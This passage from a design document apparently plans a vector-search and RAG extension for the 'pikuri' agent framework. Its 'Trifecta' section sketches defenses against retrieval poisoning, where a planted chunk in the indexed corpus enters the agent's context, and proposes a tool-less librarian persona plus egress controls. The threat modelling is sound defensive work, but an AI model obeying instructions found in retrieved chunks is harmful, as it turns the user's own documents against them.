  Qdrant later if a concrete need shows up. Demo + docs walk the
  in-memory backend first (explain how the math works), then
  promote to Chroma for persistence.
- **Embedder.** Reuses ruby_llm's `RubyLLM.embed` (OpenAI / Voyage /
  local llama.cpp's `/v1/embeddings`). Default is whatever the user's
  chat provider chose; consistency with the chat transport is what
  §"Typed transport classes (private vs public)" enforces structurally
  once that lands.
- **Reranker.** Not in ruby_llm. Lives in pikuri-core as
  `Pikuri::Transport::Reranker::LlamaServer` (speaks `/v1/rerank`
  against a cross-encoder model served by llama.cpp; same path
  Cohere's API speaks, so adding hosted providers later is a thin
  adapter — see §"Deferred"). Optional — `reranker: nil` skips
  rerank, top-k retrieval only. When configured: retrieve top-50,
  rerank → top-5. Reranker outages fall back to vector-only top-k
  and log loudly — it's a quality knob, not a correctness one.
- **Chunker.** Configurable via the extension; v1 default is
  fixed-window (512 tokens, 50 overlap) over text extracted from
  Markdown / PDF / HTML / plain text — same format set
  `Workspace::Read` already handles. Markdown-heading-aware,
  AST-aware, contextual chunking, parent-document retrieval are all
  real quality wins, all defer to follow-ups.
- **Identity.** Chunks keyed on `(path, content_hash, offset)` so
  partial updates don't blow the whole index away once incremental
  reindex lands. v1 nukes-and-reloads, but the key scheme is
  forward-compatible.

### Boot, reindex, file types

- **Boot.** `Backend::InMemory` always re-indexes at boot (data only
  lives in RAM anyway). `Backend::Chroma` indexes at boot if the
  collection is empty, otherwise leaves it alone.
- **Reindex.** `vectordb_reindex` nukes the collection and reloads
  from sources. Acceptable for v1; incremental reindex is a
  follow-up once auto-watch is on the table.
- **File types.** Plain text, Markdown, PDF, HTML — same set
  `Workspace::Read` already extracts. Other formats raise
  "unsupported"; adding more is a one-line change in the format
  table.

### The three-model ops footnote

`bin/pikuri-assistant` ends up wanting three LLM endpoints: chat
(multi-GB), embedder (200 MB – 1 GB), reranker (300 MB – 1 GB).
The recommended path on a `llama.cpp` recent enough to include
[model management](https://huggingface.co/blog/ggml-org/model-management-in-llamacpp)
(Ubuntu 26.04+ packages such a build):

- **One `llama-server` in router mode.** Started with no
  `--model` flag, it scans `~/.cache/llama.cpp/` and serves every
  cached GGUF from the same port, loading whichever model each
  request names. Single process, single port, no separate proxy
  — supersedes the older `llama-swap` recommendation. Switching
  between models costs an unload/reload (a few seconds off an
  SSD), which is fine because each chat turn touches each model
  at most once.

Larger multi-model runtimes (Ollama, LM Studio, ...) expose
OpenAI-compatible endpoints and would also work, but their size
puts them outside the auditable-by-the-user shape the rest of the
guide commits to — left to the user's own initiative if they
prefer one, not recommended in the docs.

Pikuri stays agnostic: just needs URLs. Hosts that want the
reranker resident while the router swaps chat/embed can point
`Reranker::LlamaServer.new(endpoint: …)` at a second
`llama-server` and the rest of the agent stays unchanged.

### Trifecta

The corpus *is* the threat. Anything indexed becomes a possible
context entrant whenever it matches a query — same shape as `Read`
of an untrusted file. Two structural defenses:

1. **`LIBRARIAN` persona as the default flow.** Same shape as
   `FILE_MINER` (§"Personas for `Tool::SubAgent`"): persona's only
   tool is `vectordb_search`; the parent receives a summary back,
   not raw chunks. A poisoned chunk reaches the persona — which
   has no `bash` / `write` / `fetch` / `agent` to act on. Bundled
   from `pikuri-vectordb` itself, same precedent as
   `GIT_REPO_RESEARCHER` shipping from pikuri-code (a persona that
   needs a tool outside the pikuri-subagents / pikuri-workspace
   surface). The parent can still invoke `vectordb_search` directly
   when explicitly wanted, but the default flow goes through the
   persona.
2. **Egress.** Three new outbound paths (embedder, reranker,
   backend). Local default closes leg (c) of the trifecta; remote
   embedders / rerankers re-open it. The typed transports in
   §"Typed transport classes (private vs public)" are the
   structural enforcement — once that lands, mixing a `:private`
   chat with a `:public` embedder fails at construction unless the
   agent opted into `:mixed`.

The "user knows what docs they have" assumption holds for
workspace folders. It stops holding once Onyx connectors pull in
Google Drive / Slack / Jira — by then you're indexing the open web
of your inbox, and the persona separation stops being optional.
Documented in the gem's yardoc.

### Deferred

- **Multi-corpus.** Single corpus per `Extension.new` in v1. Merge
  semantics across two corpora (which one wins on overlapping
  top-k? how does the reranker normalize scores from different
  embedders? how do you tell the LLM which corpus a chunk came
  from?) aren't worth solving when "one focused corpus per use
  case" — private notes, company handbook, project docs — is the
  realistic shape. Revisit if a concrete need arrives.
- **Multi-source roots in one corpus.** A `source: '...'` (singular)
  surface ships in v1 — single file or single directory tree.
  An earlier `sources: ['~/notes', '~/docs']` form was scoped
  initially and pulled back because same-named files across roots
  produce identical `(source, offset)` keys, hence identical
  `"source:offset"` IDs, and `Backend#upsert`'s replace-by-id
  semantics would silently let the second root's chunks overwrite
  the first's (same shape on Chroma — server-side). The
  disambiguation strategies (root-index prefix in `source`,
  content-hash IDs, per-root collection) all have ergonomic costs
  that aren't worth paying without a concrete user. Hosts that
  need multiple roots today can symlink them under one parent
  directory.
- **Auto-watch / incremental reindex.** Listen-gem dep is cheap;
  the diff logic (which chunks survived, which got replaced, which
  got deleted) is the hard part. v1 ships `vectordb_reindex` (nuke
  and reload) as the explicit path; auto-watch becomes the second
  iteration once explicit reindex is solid.
- **Classic-RAG-as-listener.** Auto-inject relevant chunks at the
  start of each turn (no tool call) — hermes' prefetch shape (see
  §"Memory" prior art). v1 ships agentic search only — fits the
  loop-agnostic ethos and the agent gets to refine queries. Add
  the listener variant if a concrete "the model forgot to search"
  pattern shows up.
- **Per-doc-type chunkers.** Markdown-heading-aware splitter,
  AST-aware code chunker, contextual chunking, parent-document
  retrieval. All real quality wins, all separately scoped features.
- **Hosted reranker providers (Cohere).** v1 ships
  `Reranker::LlamaServer` only — the privacy-aligned default.
  Cohere is the dominant hosted reranker (best-in-class on BEIR /
  MIRACL benchmarks) and a real fallback for the user who can't
  fit a third model on their GPU, at the cost of a `:public`
  egress path for queries + top-50 chunks per search. Reasonable
  follow-up once typed transports (§"Typed transport classes
  (private vs public)") land — the strict-mode enforcement
  naturally catches the cross-class wiring.
- **Onyx as a separate gem.** Onyx is a product (UI + connector
  framework + scheduler), not a vector DB. If pikuri wants Google
  Drive / Slack / Jira RAG, the right shape is `pikuri-onyx` —
  a thin tool gem that calls a self-hosted Onyx's search API over
  HTTP. Same precedent as MCP: integrate with the protocol, don't
  reimplement it. Onyx's heavy operational footprint stays opt-in
  and out of pikuri-vectordb's scope.
- **Memory v2 growth tier integration.** §"Memory" v2 needs an
  external semantic store; pikuri-vectordb is potentially the
  answer. Deliberately not optimized for that case in v1 — get
  RAG + agentic search shipped first, then re-investigate whether
  memory can ride the same primitive (probably with a separate
  collection rooted at `~/.pikuri/memory/`, fed by a different
  source pipeline). Revisit explicitly after v1 lands.

### Open questions

- **Chroma client.** Write our own thin HTTP client (4–5 endpoints,
  ~80 lines, no new dep, audit-friendly, but pikuri owns the
  breakage when Chroma's REST API shifts) vs. pull in the
  `chroma-db` gem (less maintained, version-skew risk). Default
  to writing our own unless a strong case emerges.
- **`Backend::InMemory` persistence.** Strict RAM only (honest as
  a teaching backend; everything reloads from sources on every
  boot) vs. simple `Marshal.dump` to disk (zero-ops persistence at
  the cost of blurring the educational story). Leaning strict RAM
  — the user who wants persistence has Chroma right there.
- **Disk-spillover for over-cap retrieval results.** §"Output-size
  DoS and cost" flags per-tool caps and tempfile spillover; the
  vectordb tool needs to land on the same shape from day one
  rather than retrofit it.
- **Per-source pre-processing.** Some users will want to skip
  `.git/`, `node_modules/`, build artifacts; same shape as
  `.gitignore`. v1 ships a small fixed denylist; configurable
  ignore rules defer until someone asks.
